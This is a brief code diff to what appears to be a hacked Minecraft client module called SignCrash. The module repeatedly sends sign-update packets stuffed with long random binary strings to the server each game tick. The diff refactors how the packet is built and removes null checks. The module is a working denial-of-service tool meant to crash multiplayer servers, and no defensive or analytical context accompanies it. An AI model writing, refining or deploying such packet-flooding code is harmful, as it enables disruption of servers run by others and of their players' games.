@@ -61,11 +61,10 @@ public class SignCrash extends Module {
 
     @EventHandler
     private void onTick(TickEvent.Post event) {
+        UpdateSignC2SPacket packet = new UpdateSignC2SPacket(mc.player.getBlockPos(), rndBinStr(598), rndBinStr(598),
+            rndBinStr(598), rndBinStr(598));
         for (int i = 0; i < packets.get(); i++) {
-            assert mc.player != null;
-            UpdateSignC2SPacket packet = new UpdateSignC2SPacket(mc.player.getBlockPos(), rndBinStr(598), rndBinStr(598),
-                rndBinStr(598), rndBinStr(598));
-            Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(packet);
+            mc.getNetworkHandler().sendPacket(packet);
         }
     }
 
